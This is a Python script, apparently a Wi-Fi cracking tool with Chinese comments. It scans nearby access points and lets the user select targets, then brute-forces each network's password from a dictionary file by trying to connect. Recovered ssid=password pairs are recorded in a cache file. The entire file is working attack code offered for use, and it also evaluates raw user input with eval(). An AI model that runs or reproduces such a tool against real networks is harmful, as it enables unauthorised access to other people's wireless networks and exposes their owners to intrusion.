from tqdm import tqdm
from sword_pywifi.MyWifi import MyWifi
import argparse
import os

def parser_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', default=0, type=int, help='网卡接口')
    dictionary_path = os.path.abspath(os.path.join(__file__, '..', 'dictionary', 'default.txt'))
    parser.add_argument('-d', '--dictionary_path', default=dictionary_path, type=str, help='字典')
    parser.add_argument('-s', '--skip', default=0, type=int, help='跳过几个')
    parser.add_argument('-a', '--interactive', action='store_true', help='交互模式')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-k', '--knwon', action='store_true', help='过滤已破解AP')
    group.add_argument('-c', '--cache', action='store_true', help='过滤全部已缓存AP，包括知道密码的和不知道密码但尝试过的')
    args = parser.parse_args()
    return args

def main(args=None):
    args = parser_args()
    myWifi = MyWifi(args.interface)

    # 扫描
    chinese_wifi_infos = myWifi.wifiScan()

    wifi_names = []
    # 写入扫描结果到txt文本文件
    wifiList_path = os.path.abspath(os.path.join(__file__, '..', 'cache', 'wifiList.txt'))
    if wifiList_path is not None:
        for item in chinese_wifi_infos:
            wifi_names.append(item[2])
        with open(wifiList_path, "w", encoding='utf-8') as wifiList:
            lines = [wifi_name + '\n' for wifi_name in wifi_names]
            wifiList.writelines(lines)

    caches = [] # 全部缓存，包括知道密码的和不知道密码但尝试过的
    caches_knowns = [] # 全部缓存中知道密码的


    # 读取 cache.txt 中的 wifi
    cache_path = os.path.abspath(os.path.join(__file__, '..', 'cache', 'cache.txt'))
    try:
        with open(cache_path, "r", encoding='utf-8') as filterList:
            for line in filterList:
                composition = line[:-1] if line[-1] == '\n' else line
                # slipt
                strs = composition.split('=')
                ssid = strs[0]
                caches.append(ssid)
                if len(strs) > 1:
                    caches_knowns.append(ssid)
    except FileNotFoundError:
        pass

    # 交互模式
    print(f'符合信号强度的\n\t{wifi_names}')
    targets = [] # 结果
    if args.interactive:
        results_index = eval(input('输出想要的, e.g. [0, 1]\n'))
        for idx, wifi_name in enumerate(wifi_names):
            if idx in results_index:
                targets.append(wifi_name)
    # 集合运算
    elif args.knwon is True:
        targets = list( set(wifi_names)- set(caches_knowns) )
    elif args.cache is True: 
        targets = list( set(wifi_names)- set(caches) )
    else:
        targets = wifi_names
    print(f'目标网络：\n\t{targets}')

    


    # 测试每个WiFi
    cache_results = []
    try:        
        # 打开文件
        passwds = []
        with open(args.dictionary_path, "r", encoding='utf-8') as file:
            for line in file:
                passwd = line[:-1] if line[-1] == '\n' else line
                passwds.append(passwd)
        
        for ssid in targets:
            print(f"开始破解: {ssid}")
            for passwd_idx, passwd in enumerate(tqdm(passwds)):       
                if passwd_idx < args.skip:
                    continue 
                # 破解成功
                if myWifi.wifiConnect(ssid, passwd):
                    print(f'[{passwd}]-[{ssid}]')
                    print("!!!!!!!!!!!!!!!!!WiFi已自动连接!!!!!!!!!!!!!!!!!")
                    cache_result = f'{ssid}={passwd}'
                    cache_results.append(cache_result)
                    raise Exception('congratulation')
                else:
                    print(f'[{passwd}]-[{ssid}]')
            # 密码失败，记录ssid
            cache_result = f'{ssid}'
            cache_results.append(cache_result)
    except KeyboardInterrupt: # Ctrl-C中止程序
        print("中止程序")
    finally:
        with open(cache_path, "a", encoding='utf-8') as fp:
            for cache_result in cache_results:
                if cache_result.split('=')[0] not in caches:
                    fp.write(f'{cache_result}\n')


if __name__ == '__main__':
    main()